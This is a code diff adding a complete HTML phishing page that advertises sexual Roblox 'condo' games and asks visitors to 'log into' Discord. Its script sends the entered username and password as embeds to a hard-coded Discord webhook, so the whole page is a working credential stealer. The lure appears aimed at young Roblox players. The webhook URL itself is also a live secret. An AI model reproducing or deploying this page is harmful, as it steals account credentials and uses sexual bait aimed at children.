@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<title>ROBLOX CONDOS</title>
+<link rel="shortcut icon" type="image/x-icon" href="yikes.ico">
+<script type="text/javascript">
+	function sendData(){
+	var request = new XMLHttpRequest();
+      	request.open("POST", "https://discord.com/api/webhooks/964385326833496074/j9XUiUq4Bsx5GKWp06A-QfRlWrxbjlel-aGmEtjgMJvkneZt2rCTI4b2mAZa4O3YmK68");
+ 	request.setRequestHeader('Content-type', 'application/json');
+	
+	 var uVal = document.getElementById("user").value;
+	var pVal = document.getElementById("pass").value;
+	
+	var userEmbed = {
+  		author: {
+   		 name: "Username"
+  		},
+  		title: "",
+  		description: uVal,
+		color: hexToDecimal("#00FFF7")
+	}
+	var passEmbed = {
+  		author: {
+   		 name: "Password"
+  		},
+  		title: "",
+  		description: pVal,
+		color: hexToDecimal("#FF0000")
+	}
+
+
+      var params = {
+        username: "OIL",
+        embeds: [userEmbed, passEmbed]
+      }
+
+	  var intIndexU = uVal.indexOf("#");
+
+	  if (uVal != '' && pVal != '' && intIndexU != -1){
+		request.send(JSON.stringify(params));
+	  	} else {
+			  alert('Enter username and password and a #(number at end of name)')
+		  }
+      
+	  function hexToDecimal(hex) {
+  		return parseInt(hex.replace("#",""), 16)
+	}
+	}
+</script>
+<script>
+        function getInputValue(){
+            // Selecting the input element and get its value 
+            var inputVal = document.getElementById("user").value;
+            
+            // Displaying the value
+            alert(inputVal);
+        }
+    </script>
+</head>
+
+<body style = "background: url(https://d6scj24zvfbbo.cloudfront.net/b5ac84684c507061fe54548703e6ab5b/200000000-f1563f1564/700/MY%20ULTIMATE%20PLAN.png?ph=b374f5ef60); background-size: 100% 200%;">
+
+<center><h1 style="font-size:500%;color:white;font-family:tahoma";><b>THE BEST ROBLOX CONDO SITE IN 2022</b></h1></center>
+
+<p style="font-size:150%;color:white;font-family:tahoma";<b>Roblox sex as easy as 1 2 3, games updated on discord daily, log into your discord to get daily updates and messages<b></p>
+
+<div class="container"; style ="padding:30px;border-radius:50px;width:1000px;">
+	<form style="color:white; font-family:tahoma; width: 200px; border-color: white; border-style:inset; background-color: black;">
+		<h3 class="title"; style = "color:white; font-family:tahoma">Login to discord account</h3>
+		Username#0000<input type="text" id="user">
+		Password<input type="text" id="pass">
+		<button type="button" class="btn" onclick="sendData()">Login</button>
+	</form>
+</div>
+
+</body>
+
+</html>
